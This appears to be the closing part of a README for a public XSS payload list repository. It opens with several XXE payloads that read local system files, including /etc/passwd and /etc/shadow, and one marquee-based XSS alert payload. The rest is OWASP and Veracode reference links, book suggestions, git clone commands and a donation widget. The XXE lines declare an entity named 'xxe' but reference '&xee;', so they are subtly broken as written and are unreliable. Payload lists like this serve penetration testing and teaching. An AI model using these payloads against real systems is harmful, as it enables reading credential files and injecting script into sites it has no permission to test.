&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM "file://c:/boot.ini"&gt;]&gt;&lt;foo&gt;&xee;&lt;/foo&gt;

&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt;&xee;&lt;/foo&gt;

&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM "file:///etc/shadow"&gt;]&gt;&lt;foo&gt;&xee;&lt;/foo&gt;

&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM "file:///dev/random"&gt;]&gt;&lt;foo&gt;&xee;&lt;/foo&gt;

&lt;marquee onstart='javascript:alert('1');'&gt;=(◕_◕)=

&gt;


#### References :

###### Cross-site Scripting (XSS)

* 👉 https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)

###### XSS (Cross Site Scripting) Prevention Cheat Sheet

* 👉 https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet

###### DOM based XSS Prevention Cheat Sheet

* 👉 https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet

###### Testing for Reflected Cross site scripting (OTG-INPVAL-001)

* 👉 https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001)

###### Testing for Stored Cross site scripting (OTG-INPVAL-002)

* 👉 https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002)

###### Testing for DOM-based Cross site scripting (OTG-CLIENT-001)

* 👉 https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)

###### DOM Based XSS

* 👉 https://www.owasp.org/index.php/DOM_Based_XSS

###### Cross-Site Scripting (XSS) Cheat Sheet | Veracode

* 👉 https://www.veracode.com/security/xss

#### Recommended books :

* [XSS Attacks: Cross-site Scripting Exploits and Defense](https://books.google.com.tr/books/about/XSS_Attacks.html?id=dPhqDe0WHZ8C)

* [XSS Cheat Sheet](https://leanpub.com/xss)


### Cloning an Existing Repository ( Clone with HTTPS )
```
root@ismailtasdelen:~# git clone https://github.com/ismailtasdelen/xss-payload-list.git
```

### Cloning an Existing Repository ( Clone with SSH )
```
root@ismailtasdelen:~# git clone git@github.com:ismailtasdelen/xss-payload-list.git
```

### Published Website :

##### Kitploit - https://www.kitploit.com/2018/05/xss-payload-list-cross-site-scripting.html

### Donate!

Support the authors:

#### LiberaPay:

<noscript><a href="https://liberapay.com/ismailtasdelen/donate"><img alt="Donate using Liberapay" src="https://liberapay.com/assets/widgets/donate.svg"></a></noscript>
--end--










